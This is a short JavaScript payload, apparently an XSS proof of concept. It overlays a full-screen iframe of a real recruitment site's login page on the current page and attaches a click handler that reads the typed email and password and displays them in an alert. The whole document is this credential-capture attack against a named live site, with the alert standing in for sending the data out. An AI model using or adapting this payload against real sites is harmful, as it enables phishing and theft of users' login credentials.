let iframe=document.createElement("iframe");
iframe.src="https://www.randstad.be/en/my-randstad/login/"
iframe.referrerPolicy="no-referrer"
iframe.style="position: fixed; top:0; left:0; bottom:0; right:0; width: 100%; height:100%; border:none; margin:0; padding:0; overflow: hidden; z-index:999999;";
document.body.appendChild(iframe)
iframe.contentWindow.addEventListener("DOMContentLoaded", () => {
let loginbutton=iframe.contentWindow.document.getElementsByClassName("form-group")[5];
loginbutton.onclick=()=>
{
let email=iframe.contentWindow.document.getElementById("field--email").value;
let pass=iframe.contentWindow.document.getElementById("field--password").value;
alert(`${email} : ${pass}`)
}
})
